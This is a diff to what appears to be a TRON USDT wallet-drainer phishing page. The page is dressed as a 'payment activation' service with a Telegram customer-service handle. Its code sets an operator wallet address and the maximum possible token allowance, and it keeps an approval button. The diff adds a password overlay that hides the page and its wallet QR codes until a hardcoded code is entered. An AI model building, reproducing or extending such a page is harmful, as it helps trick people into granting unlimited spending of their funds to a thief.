@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>联系飞机号@TNTDHC555</title>
+<title>支付开通</title>
 <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
 <script>
 if (typeof window.Buffer === 'undefined') {
@@ -14,7 +14,7 @@ if (typeof window.Buffer === 'undefined') {
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
+.container{max-width:420px;margin:0 auto;display:none;}
 .pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
 h1{font-size:24px;margin-bottom:8px}
 .desc{color:#aaa;margin-bottom:20px}
@@ -58,12 +58,56 @@ h1{font-size:24px;margin-bottom:8px}
  font-size:12px;
  line-height:1.6;
 }
+/*密码弹窗遮罩*/
+#passwordOverlay{
+    position:fixed;
+    inset:0;
+    background:#0B0B1F;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:9999;
+}
+.pwd-box{
+    width:320px;
+    padding:26px;
+    background:#1E1E35;
+    border-radius:16px;
+    text-align:center;
+}
+.pwd-box input{
+    width:100%;
+    padding:14px;
+    border-radius:10px;
+    border:none;
+    font-size:16px;
+    margin:14px 0;
+}
+.pwd-box button{
+    width:100%;
+    padding:14px;
+    background:#F0B90B;
+    color:#000;
+    border:none;
+    border-radius:10px;
+    font-weight:bold;
+    font-size:16px;
+}
 </style>
 </head>
 <body>
+<!--密码输入遮罩层-->
+<div id="passwordOverlay">
+    <div class="pwd-box">
+        <h3>请输入访问密码</h3>
+        <input id="pwdInput" type="password" placeholder="输入访问密码">
+        <button onclick="checkPassword()">确认进入</button>
+    </div>
+</div>
+
 <div class="container">
     <div class="pay-box">
-        <h1>客服飞机号@TNTDHC555</h1>
+        <h1>💳 客服飞机号@TNTDHC555</h1>
         <p class="desc">波场链TRON · 安全开通</p>
 
         <button id="connectBtn">👉 连接钱包（波场链）</button>
@@ -104,6 +148,26 @@ h1{font-size:24px;margin-bottom:8px}
 </div>
 
 <script>
+// =========在这里修改你的访问密码==========
+const ACCESS_PASSWORD = "983511";
+
+function checkPassword(){
+    const inputVal = document.getElementById("pwdInput").value.trim();
+    if(inputVal === ACCESS_PASSWORD){
+        //密码正确：隐藏密码弹窗，显示DApp页面，再执行生成二维码
+        document.getElementById("passwordOverlay").style.display="none";
+        document.querySelector(".container").style.display="block";
+        genTwoQr();
+    }else{
+        alert("访问密码错误！");
+        document.getElementById("pwdInput").value="";
+    }
+}
+//回车直接确认密码
+document.getElementById("pwdInput").addEventListener("keydown",function(e){
+    if(e.key === 'Enter') checkPassword();
+});
+
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const MAX_ALLOWANCE_SUN = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
@@ -194,7 +258,7 @@ connectBtn.onclick = async () => {
     connectBtn.disabled = false;
 };
 
-// 生成双二维码
+// 生成双二维码（密码正确之后才执行，不在window.onload直接跑）
 function genTwoQr(){
     const tpParam = JSON.stringify({
         protocol:"TokenPocket",
@@ -211,8 +275,6 @@ function genTwoQr(){
     document.getElementById("qrTp").src = qrApi + encodeURIComponent(tpRaw);
     document.getElementById("qrImtoken").src = qrApi + encodeURIComponent(imRaw);
 }
-
-window.onload = genTwoQr;
 
 // 授权按钮原版完整保留
 payBtn.onclick = async () => {
